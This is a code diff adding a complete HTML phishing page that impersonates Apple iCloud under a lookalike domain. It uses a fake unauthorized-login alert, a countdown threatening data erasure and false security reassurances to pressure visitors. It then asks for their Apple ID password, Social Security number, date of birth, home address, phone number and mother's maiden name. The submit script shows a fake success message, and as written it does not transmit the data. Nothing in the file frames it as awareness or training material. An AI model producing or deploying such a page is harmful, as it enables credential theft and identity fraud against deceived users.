@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Critical Security Warning – Verify Your Identity</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --apple-blue: #0071e3;
+            --apple-dark: #1d1d1f;
+            --apple-gray: #f5f5f7;
+            --apple-border: #d2d2d7;
+            --apple-red: #ff3b30;
+            --apple-orange: #ff9500;
+            --apple-text: #1d1d1f;
+            --apple-secondary: #86868b;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #e8e8ed;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .browser-chrome {
+            width: 100%;
+            max-width: 780px;
+            margin-top: 28px;
+            background: #f6f6f8;
+            border-radius: 10px 10px 0 0;
+            border: 1px solid #c8c8cc;
+            border-bottom: none;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 -1px 0 rgba(0, 0, 0, 0.04);
+        }
+
+        .traffic-lights {
+            display: flex;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+
+        .traffic-light {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3);
+        }
+
+        .traffic-light.red {
+            background: #ff5f57;
+        }
+        .traffic-light.yellow {
+            background: #febc2e;
+        }
+        .traffic-light.green {
+            background: #28c840;
+        }
+
+        .url-bar {
+            flex: 1;
+            background: #ffffff;
+            border-radius: 7px;
+            padding: 8px 14px;
+            font-family: 'SF Mono', 'Menlo', 'Consolas', 'Courier New', monospace;
+            font-size: 12px;
+            color: #3a3a3c;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid #dddde0;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.04);
+            min-width: 0;
+        }
+
+        .url-bar .lock-icon {
+            color: #34c759;
+            font-size: 13px;
+            flex-shrink: 0;
+        }
+
+        .url-bar .domain {
+            font-weight: 600;
+            color: #1d1d1f;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .url-bar .path {
+            color: #8e8e93;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 780px;
+            background: #ffffff;
+            border-radius: 0 0 12px 12px;
+            border: 1px solid #c8c8cc;
+            border-top: 1px solid #e5e5ea;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.12);
+            overflow: hidden;
+            margin-bottom: 40px;
+        }
+
+        .header {
+            background: #1d1d1f;
+            padding: 24px 32px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            border-bottom: 1px solid #333;
+        }
+
+        .apple-logo {
+            width: 44px;
+            height: 44px;
+            flex-shrink: 0;
+        }
+
+        .apple-logo svg {
+            width: 100%;
+            height: 100%;
+            fill: #ffffff;
+        }
+
+        .header-text h1 {
+            font-size: 19px;
+            font-weight: 600;
+            color: #ffffff;
+            letter-spacing: -0.2px;
+            margin: 0 0 2px;
+        }
+
+        .header-text p {
+            font-size: 13px;
+            color: #a1a1a6;
+            font-weight: 400;
+            letter-spacing: 0.1px;
+        }
+
+        .urgency-banner {
+            background: #fff2f0;
+            border-left: 4px solid #ff3b30;
+            margin: 0;
+            padding: 16px 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            border-bottom: 1px solid #fdd8d5;
+        }
+
+        .urgency-banner .warning-icon {
+            font-size: 22px;
+            flex-shrink: 0;
+            line-height: 1;
+        }
+
+        .urgency-banner .urgency-content {
+            flex: 1;
+        }
+
+        .urgency-banner .urgency-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #c41e00;
+            margin-bottom: 4px;
+            letter-spacing: -0.1px;
+        }
+
+        .urgency-banner .urgency-text {
+            font-size: 12px;
+            color: #8b2e1a;
+            line-height: 1.5;
+        }
+
+        .countdown-container {
+            background: #1d1d1f;
+            padding: 14px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            border-bottom: 1px solid #333;
+        }
+
+        .countdown-label {
+            font-size: 13px;
+            color: #ff9f0a;
+            font-weight: 600;
+            letter-spacing: -0.1px;
+        }
+
+        .countdown-timer {
+            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
+            font-size: 20px;
+            font-weight: 700;
+            color: #ff3b30;
+            background: #2c2c2e;
+            padding: 6px 16px;
+            border-radius: 6px;
+            letter-spacing: 1px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.6;
+            }
+        }
+
+        .security-details {
+            background: #f9f9fb;
+            padding: 18px 24px;
+            border-bottom: 1px solid #e5e5ea;
+        }
+
+        .security-details .detail-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 8px;
+            font-size: 12px;
+            color: #48484a;
+            line-height: 1.5;
+        }
+
+        .security-details .detail-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .security-details .detail-icon {
+            flex-shrink: 0;
+            font-size: 14px;
+            color: #8e8e93;
+            margin-top: 1px;
+        }
+
+        .security-details .detail-label {
+            font-weight: 600;
+            color: #1d1d1f;
+        }
+
+        .form-container {
+            padding: 28px 32px 32px;
+        }
+
+        .form-section-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #0071e3;
+            letter-spacing: -0.1px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #1d1d1f;
+            margin-bottom: 5px;
+            letter-spacing: 0.1px;
+        }
+
+        .form-group label .required {
+            color: #ff3b30;
+            margin-left: 2px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #d2d2d7;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #1d1d1f;
+            background: #ffffff;
+            transition: all 0.2s ease;
+            letter-spacing: 0.1px;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #0071e3;
+            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.12);
+            background: #fafaff;
+        }
+
+        .form-group input::placeholder {
+            color: #aeaeb2;
+            font-size: 13px;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            color: #166534;
+        }
+
+        .security-badge .badge-icon {
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: #0071e3;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            letter-spacing: -0.1px;
+            transition: all 0.2s ease;
+            margin-top: 6px;
+            font-family: inherit;
+            box-shadow: 0 2px 8px rgba(0, 113, 227, 0.25);
+        }
+
+        .submit-btn:hover {
+            background: #0077ed;
+            box-shadow: 0 4px 16px rgba(0, 113, 227, 0.35);
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:active {
+            background: #0068d6;
+            transform: translateY(0);
+            box-shadow: 0 1px 4px rgba(0, 113, 227, 0.2);
+        }
+
+        .footer {
+            background: #f5f5f7;
+            padding: 16px 32px;
+            text-align: center;
+            font-size: 11px;
+            color: #86868b;
+            border-top: 1px solid #e5e5ea;
+            letter-spacing: 0.1px;
+            line-height: 1.6;
+        }
+
+        .footer .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-bottom: 6px;
+        }
+
+        .footer .footer-link {
+            color: #515154;
+            text-decoration: none;
+            font-size: 11px;
+        }
+
+        .success-overlay {
+            display: none;
+            text-align: center;
+            padding: 60px 40px;
+        }
+
+        .success-overlay.active {
+            display: block;
+        }
+
+        .success-overlay .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #34c759;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 40px;
+            color: #ffffff;
+            box-shadow: 0 8px 30px rgba(52, 199, 89, 0.3);
+        }
+
+        .success-overlay h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1d1d1f;
+            margin-bottom: 10px;
+            letter-spacing: -0.2px;
+        }
+
+        .success-overlay p {
+            font-size: 14px;
+            color: #86868b;
+            line-height: 1.6;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .success-overlay .shield-icon-large {
+            font-size: 72px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        #formSection {
+            display: block;
+        }
+
+        #formSection.hidden {
+            display: none;
+        }
+
+        @media (max-width: 600px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            .form-container {
+                padding: 20px 18px;
+            }
+            .header {
+                padding: 18px 20px;
+            }
+            .header-text h1 {
+                font-size: 16px;
+            }
+            .countdown-container {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+            .main-container {
+                border-radius: 0 0 8px 8px;
+            }
+            .browser-chrome {
+                border-radius: 8px 8px 0 0;
+                margin-top: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="browser-chrome">
+        <div class="traffic-lights">
+            <span class="traffic-light red"></span>
+            <span class="traffic-light yellow"></span>
+            <span class="traffic-light green"></span>
+        </div>
+        <div class="url-bar">
+            <span class="lock-icon">🔒</span>
+            <span class="domain">https://apple-icloud-verify.com</span>
+            <span class="path">/account/security-verification/urgent</span>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="header">
+            <div class="apple-logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+                </svg>
+            </div>
+            <div class="header-text">
+                <h1>iCloud Account Protection</h1>
+                <p>Apple ID Security &amp; Identity Verification Center</p>
+            </div>
+        </div>
+
+        <div class="urgency-banner">
+            <span class="warning-icon">⚠️</span>
+            <div class="urgency-content">
+                <div class="urgency-title">WARNING: Your account will be locked and all data erased in 30 minutes without verification.</div>
+                <div class="urgency-text">We've detected unauthorized access to your iCloud account from an unknown device. To prevent permanent deletion of your photos, files, and account data, you must complete identity verification immediately.</div>
+            </div>
+        </div>
+
+        <div class="countdown-container">
+            <span class="countdown-label">⏱ TIME REMAINING BEFORE ACCOUNT LOCK:</span>
+            <span class="countdown-timer" id="countdown">29:58</span>
+        </div>
+
+        <div class="security-details">
+            <div class="detail-row">
+                <span class="detail-icon">📍</span>
+                <span><span class="detail-label">Suspicious Login Location:</span> Moscow, Russia (IP: 185.xxx.xx.42)</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-icon">💻</span>
+                <span><span class="detail-label">Unknown Device:</span> Windows PC – Chrome Browser (First seen: Today)</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-icon">🕐</span>
+                <span><span class="detail-label">Detection Time:</span> <span id="detectionTime">Just now</span></span>
+            </div>
+        </div>
+
+        <div id="formSection">
+            <div class="form-container">
+                <div class="form-section-title">🔐 Identity Verification Required</div>
+
+                <div class="security-badge">
+                    <span class="badge-icon">🛡️</span>
+                    <span>Your information is encrypted and secure. This verification is required by Apple's security protocol to restore your account.</span>
+                </div>
+
+                <form id="verificationForm" onsubmit="handleSubmit(event)">
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="apple_id">Apple ID <span class="required">*</span></label>
+                            <input type="text" id="apple_id" name="apple_id" placeholder="johnappleseed@icloud.com" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Password <span class="required">*</span></label>
+                            <input type="password" id="password" name="password" placeholder="Enter your Apple ID password" required autocomplete="off">
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="full_name">Full Name <span class="required">*</span></label>
+                            <input type="text" id="full_name" name="full_name" placeholder="John Appleseed" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="dob">Date of Birth <span class="required">*</span></label>
+                            <input type="text" id="dob" name="dob" placeholder="MM/DD/YYYY" required autocomplete="off">
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="ssn">Social Security Number <span class="required">*</span></label>
+                            <input type="text" id="ssn" name="ssn" placeholder="123-45-6789" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Phone Number <span class="required">*</span></label>
+                            <input type="text" id="phone" name="phone" placeholder="(555) 123-4567" required autocomplete="off">
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group full-width">
+                            <label for="address">Home Address <span class="required">*</span></label>
+                            <input type="text" id="address" name="address" placeholder="1 Infinite Loop, Cupertino, CA 95014" required autocomplete="off">
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group full-width">
+                            <label for="sec_question">Security Question: Mother's Maiden Name <span class="required">*</span></label>
+                            <input type="text" id="sec_question" name="sec_question" placeholder="Enter your mother's maiden name" required autocomplete="off">
+                        </div>
+                    </div>
+
+                    <button type="submit" class="submit-btn">Verify My Identity &amp; Secure Account</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="success-overlay" id="successOverlay">
+            <span class="shield-icon-large">✅</span>
+            <div class="success-icon">✓</div>
+            <h2>Identity Verified Successfully</h2>
+            <p>Your iCloud account has been secured. All unauthorized access has been blocked. Your photos, files, and data are now protected.<br><br>You will be redirected to your iCloud dashboard shortly. Thank you for helping us keep your account safe.</p>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <span class="footer-link">Privacy Policy</span>
+                <span class="footer-link">Terms of Use</span>
+                <span class="footer-link">Support</span>
+                <span class="footer-link">My Apple ID</span>
+            </div>
+            Copyright &copy; 2024 Apple Inc. All rights reserved.<br>
+            Apple ID Security Center &bull; 1 Infinite Loop, Cupertino, CA 95014
+        </div>
+    </div>
+
+    <script>
+        var countdownMinutes = 29;
+        var countdownSeconds = 58;
+        var countdownEl = document.getElementById('countdown');
+        var detectionTimeEl = document.getElementById('detectionTime');
+
+        function updateCountdown() {
+            if (countdownSeconds === 0) {
+                if (countdownMinutes === 0) {
+                    countdownEl.textContent = '00:00';
+                    countdownEl.style.color = '#ff3b30';
+                    return;
+                }
+                countdownMinutes--;
+                countdownSeconds = 59;
+            } else {
+                countdownSeconds--;
+            }
+            var minStr = countdownMinutes < 10 ? '0' + countdownMinutes : countdownMinutes;
+            var secStr = countdownSeconds < 10 ? '0' + countdownSeconds : countdownSeconds;
+            countdownEl.textContent = minStr + ':' + secStr;
+
+            if (countdownMinutes < 5) {
+                countdownEl.style.color = '#ff3b30';
+                countdownEl.style.animation = 'pulse 0.8s ease-in-out infinite';
+            }
+        }
+
+        setInterval(updateCountdown, 1000);
+
+        function updateDetectionTime() {
+            var now = new Date();
+            var timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
+            detectionTimeEl.textContent = timeStr + ' EST';
+        }
+        updateDetectionTime();
+        setInterval(updateDetectionTime, 30000);
+
+        function handleSubmit(event) {
+            event.preventDefault();
+            document.getElementById('formSection').classList.add('hidden');
+            document.getElementById('successOverlay').classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+    </script>
+</body>
+</html>
